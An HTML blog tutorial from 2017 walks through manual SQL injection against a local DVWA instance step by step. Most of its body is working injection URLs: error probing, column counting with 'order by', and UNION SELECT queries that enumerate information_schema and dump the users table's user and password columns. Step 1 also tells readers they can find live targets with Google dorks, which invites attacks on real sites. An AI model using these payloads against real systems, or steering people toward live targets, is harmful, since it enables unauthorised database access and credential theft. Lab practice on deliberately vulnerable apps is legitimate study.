@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>
+    how to do SQL Injection Manually - Bitforestinfo
+    
+  </title>
+
+  <meta name="description" content="Namaste Friends,Today, In This Post I Am Going To Show You How To Manually Perform SQL Injection Attacks On Web sites.So, Let&#39;s Quickly Start Our Tutorial.Wh...">
+
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="/assets/vendor/bootstrap/css/bootstrap.min.css">
+
+  <link rel="stylesheet" href="/assets/vendor/fontawesome-free/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://www.bitforestinfo.com/2017/08/16/how-to-do-sql-injection-manually.html">
+  <link rel="alternate" type="application/rss+xml" title="Bitforestinfo" href="/feed.xml">
+
+</head>
+
+
+<body>
+
+  <!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  <div class="container">
+    <a class="navbar-brand" href="/">Bitforestinfo</a>
+    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+      Menu
+      <i class="fa fa-bars"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarResponsive">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/">Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/about">About</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/posts">Posts</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/contact">Contact</a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+
+  <!-- Page Header -->
+
+  <header class="masthead">
+    
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>how to do SQL Injection Manually</h1>
+            
+            <span class="meta">Posted by
+              <a href="#">Suraj Singh</a>
+              on August 16, 2017 &middot; <span class="reading-time" title="Estimated read time">
+  
+   7 mins  read </span>
+
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+
+        <div dir="ltr" style="text-align: left;" trbidi="on">Namaste Friends,<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-T8JNIqvkIEI/WZNIEvSJIFI/AAAAAAAABXU/m_0iIG3uGnITZsfnmQYBKfX0QChSPysfACEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-15%2B23-40-09.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://2.bp.blogspot.com/-T8JNIqvkIEI/WZNIEvSJIFI/AAAAAAAABXU/m_0iIG3uGnITZsfnmQYBKfX0QChSPysfACEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-15%2B23-40-09.png" width="640" /></a></div><br /><br />Today, In This Post I Am Going To Show You How To Manually Perform SQL Injection Attacks On Web sites.<br /><br />So, Let's Quickly Start Our Tutorial.<br /><h3 style="text-align: center;"><span style="font-size: large;">What Is SQL Injection Attack?</span></h3><br /><div style="text-align: left;">SQL injection is one type of vulnerability in web server. In Which, Attacker Can Insert</div><div style="text-align: left;"><br /></div><div style="text-align: left;">different type of SQL statements, syntax and commands (also commonly refers to as a malicious</div><div style="text-align: left;"><br /></div><div style="text-align: left;">payload.) and can also execute that statements on the server. <a href="http://www.bitforestinfo.com/2017/03/what-is-sql-injection-attack-sqli-how.html">read more &gt;&gt;</a></div><div><br /></div><div><br /></div><div>Friends Here, For Practise Purpose I Am Using DVWA (Damn Vulnerable Web application) On Local Server. As You Can See In Below Image But if you are new, <a href="http://www.bitforestinfo.com/2017/05/what-is-metasploitable-what-are-the-usages-of-metasploitable-iso-best-for-penetration-testing.html">read here &gt;&gt;&gt;</a></div><h3 style="text-align: center;">SQL Injection Manually Tutorial Steps</h3><h4 style="text-align: left;">Step 1.</h4>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Our First Step is to find a target URL to exploit the sql&nbsp;vulnerability. Here, I am Using Metasploit-able&nbsp;vulnerable machine as target URL but you can also find live&nbsp;targets with the help of google dorks. For Google Dorks Usages<a href="http://www.bitforestinfo.com/2017/08/find-vulnerable-sql-injection-sites.html"> Read Here</a><br /><br /><b>Target Url :</b><br /><br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-T8JNIqvkIEI/WZNIEvSJIFI/AAAAAAAABXU/m_0iIG3uGnITZsfnmQYBKfX0QChSPysfACEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-15%2B23-40-09.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://2.bp.blogspot.com/-T8JNIqvkIEI/WZNIEvSJIFI/AAAAAAAABXU/m_0iIG3uGnITZsfnmQYBKfX0QChSPysfACEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-15%2B23-40-09.png" width="640" /></a></div><br /><br /><h4 style="text-align: left;">Step 2.</h4>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Now, Our Second Step is To Verify&nbsp;That Our Selected Target Url is Vulnerable For SQL Injection Attack and for this, you just need to add '&nbsp; after "=" Sign Or After The Number Query in Url.<br /><br />After Editing Our Url Will Look Like This:<br /><br /><div style="text-align: center;"><b><br /></b></div><div style="text-align: center;"><b>&nbsp;http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1'&amp;Submit=Submit#</b></div><div style="text-align: center;"><b>or</b></div><div style="text-align: center;"><b>&nbsp;http://192.168.1.101/dvwa/vulnerabilities/sqli/?id='1&amp;Submit=Submit#</b></div><br />And After Submitting Url, If You Get Any Type Of SQL Error Message Than Your Selected Target Is Vulnerable Of SQL Injection. As You Can See In Below ScreenShot.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-eQijpaLUJAQ/WZNIEqOQ8gI/AAAAAAAABXM/JqvcB4a_KQ0f4CoN3agwZBlmNX-ittnBACEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-14-07.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://2.bp.blogspot.com/-eQijpaLUJAQ/WZNIEqOQ8gI/AAAAAAAABXM/JqvcB4a_KQ0f4CoN3agwZBlmNX-ittnBACEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-14-07.png" width="640" /></a></div><br /><br /><h4 style="text-align: left;">Step 3.</h4>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Now, We Need To Make Our URL Stable For Injecting Our SQL Statements Through URL.<br />And For This, You Just Need To Add --+ <b>or </b># After The ' Query.<br /><br />Then, Our Url Will Look Like This:<br /><br /><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1'--+&amp;Submit=Submit#</b><br /><div style="text-align: center;"><br /></div>And After Submitting This Url, If Our Webpage is not showing any type of error that&nbsp;means our URL is now stable for injecting SQL Query.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-g95VRO21CYU/WZNIE7x6zeI/AAAAAAAABXQ/TgDUYLddgjMFgmQjS6GqlM53-WkzQ2EEwCEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-14-20.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://1.bp.blogspot.com/-g95VRO21CYU/WZNIE7x6zeI/AAAAAAAABXQ/TgDUYLddgjMFgmQjS6GqlM53-WkzQ2EEwCEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-14-20.png" width="640" /></a></div><br /><br /><br /><b>Step 4.</b><br /><br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Now, Our Next Move Is To Find Total Number Of Columns Present In Current Working Table.<br />And For This, We Just Need To Add <i>' order by n'</i> where n is a number of columns. basically, here we will use incrementing values and try to guess a number of columns available in the table. so, what we will do? we will increase column number one by one until Webpage Not Provide us Unknown Column Error Because with Unknown Columns Error We Can Easily Guess Numbers Of Columns Present In Table. For Example<br /><br /><br /><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' order by n --+&amp;Submit=Submit#</b><br /><b style="text-align: center;"><br /></b><b style="text-align: center;"><br /></b><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' order by 1 --+&amp;Submit=Submit# --&gt; No Error</b><br /><br /><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' order by 2 --+&amp;Submit=Submit#</b><b style="text-align: center;">&nbsp;--&gt; No Error</b><br /><b style="text-align: center;"><br /></b><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' order by 3 --+&amp;Submit=Submit#</b><b style="text-align: center;">&nbsp;--&gt; Error</b><br /><br />Here, As you Can See We Get Error On Number 3 Column Means There are Only 2 Columns Available In Table.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-zLvFu9v9Q_A/WZNIGDCJlKI/AAAAAAAABXY/Vct1zp0BBn023LRWH8pKNdjMz2LgWrlpwCEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-14-34.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://2.bp.blogspot.com/-zLvFu9v9Q_A/WZNIGDCJlKI/AAAAAAAABXY/Vct1zp0BBn023LRWH8pKNdjMz2LgWrlpwCEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-14-34.png" width="640" /></a></div><br /><br /><br /><b>Step 5.</b><br /><b><br /></b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Now, We Know that there are&nbsp;2 columns available in the table. so, &nbsp;Our Next Step Is To Find Vulnerable Column In MySql And For This We Will Just Add Some Value In Place Of Column To Verify Their Presence In Web page Source.<br /><br />For Example:<br /><br /><b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 111, 101 --+&amp;Submit=Submit#</b><br /><br />After Submitting, Pay Attention to&nbsp;Webpage Content and try to find our injected column values in the webpage as you can see in below screenshot, Both Columns Are Vulnerable For SQL Injection.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-m_LOAXEltFI/WZNIGBPuyxI/AAAAAAAABXc/8uygollUTrcoQumg-5ctK-A7d90qQU8jwCEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-14-57.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://1.bp.blogspot.com/-m_LOAXEltFI/WZNIGBPuyxI/AAAAAAAABXc/8uygollUTrcoQumg-5ctK-A7d90qQU8jwCEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-14-57.png" width="640" /></a></div><br /><br /><b>Step 6.</b><br /><br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Now, We Know Which Column is Vulnerable For SQL injection. So, Let's Use This Vulnerable Column To Find Table names Available In Current Database.<br /><br />To Find All Table Names : &nbsp;<b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null, table_name FROM information_schema.tables --+&amp;Submit=Submit#</b><br /><b style="text-align: center;"><br /></b><br />To Find Current Table Name :&nbsp;<b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --+&amp;Submit=Submit#</b><br /><br />As You Can See In below ScreenShot, Webpage Is Showing Name Of Tables Available In Database.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-0pKjwZT1vE0/WZNIGMX_KqI/AAAAAAAABXg/6YHL0qgaIy8XYbh6HuQoFh2v_2V6lgLVgCEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-31-28.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://4.bp.blogspot.com/-0pKjwZT1vE0/WZNIGMX_KqI/AAAAAAAABXg/6YHL0qgaIy8XYbh6HuQoFh2v_2V6lgLVgCEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-31-28.png" width="640" /></a></div><br /><br /><br /><b>Step 7.</b><br /><br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Now, We Know Which Columns are Vulnerable For SQL injection And Current Table Name. So, Let's Use This Information To Find Numbers Of Columns Available In Current Database Tables.<br /><br />To Find All Column Names : &nbsp;<b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema=database() --+&amp;Submit=Submit#</b><br /><b style="text-align: center;"><br /></b><br />As You Can See In below ScreenShot, Webpage Is Showing Name Of Tables Available In Database.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-oeEBarGXS6s/WZNIHPb3zKI/AAAAAAAABXk/b88N54N8Y3oR3gErAiTtECQ52A_Gx4CNACEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-31-57.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://3.bp.blogspot.com/-oeEBarGXS6s/WZNIHPb3zKI/AAAAAAAABXk/b88N54N8Y3oR3gErAiTtECQ52A_Gx4CNACEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-31-57.png" width="640" /></a></div><br /><br /><br /><br /><br /><b>Step 8.</b><br /><b><br /></b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;At The End, To Extract user and password columns from Table. Enter Below Commands.<br /><br />URL:&nbsp;<b style="text-align: center;">http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user, password FROM users --+&amp;Submit=Submit#</b><br /><b style="text-align: center;"><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-LeBzT_VMPUU/WZNIHVigFuI/AAAAAAAABXo/nH-33deIIN0GKYQRUbUwsBv1yvI-UH7iACEwYBhgL/s1600/Screenshot%2Bfrom%2B2017-08-16%2B00-32-27.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="744" data-original-width="1311" height="362" src="https://2.bp.blogspot.com/-LeBzT_VMPUU/WZNIHVigFuI/AAAAAAAABXo/nH-33deIIN0GKYQRUbUwsBv1yvI-UH7iACEwYBhgL/s640/Screenshot%2Bfrom%2B2017-08-16%2B00-32-27.png" width="640" /></a></div><br /><br /><br /><br />Done!<br /><br /><br />Written By:<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SSB<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div>
+
+        <hr>
+
+        <div class="clearfix">
+
+          
+          <a class="btn btn-primary float-left" href="/2017/08/15/latest-google-dorks-list.html" data-toggle="tooltip" data-placement="top" title="Latest Google Dorks List">&larr; Previous<span class="d-none d-md-inline">
+              Post</span></a>
+          
+          
+          <a class="btn btn-primary float-right" href="/2017/08/21/what-is-burp-suite-and-its-features.html" data-toggle="tooltip" data-placement="top" title="What is Burp Suite And its Features?">Next<span class="d-none d-md-inline">
+              Post</span> &rarr;</a>
+          
+
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+
+  <!-- Footer -->
+
+<hr>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+        <ul class="list-inline text-center">
+          
+          <li class="list-inline-item">
+            <a href="mailto:surajsinghbisht054@gmail.com">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+          
+          
+          
+          
+          <li class="list-inline-item">
+            <a href="https://github.com/surajsinghbisht054">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+          
+        </ul>
+        <p class="copyright text-muted">Copyright &copy; Suraj 2020</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  <script src="/assets/vendor/jquery/jquery.min.js"></script>
+<script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="/assets/vendor/startbootstrap-clean-blog/js/clean-blog.min.js"></script>
+
+<script src="/assets/scripts.js"></script>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-90652126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-90652126-1');
+</script>
+
+
+
+</body>
+
+</html>
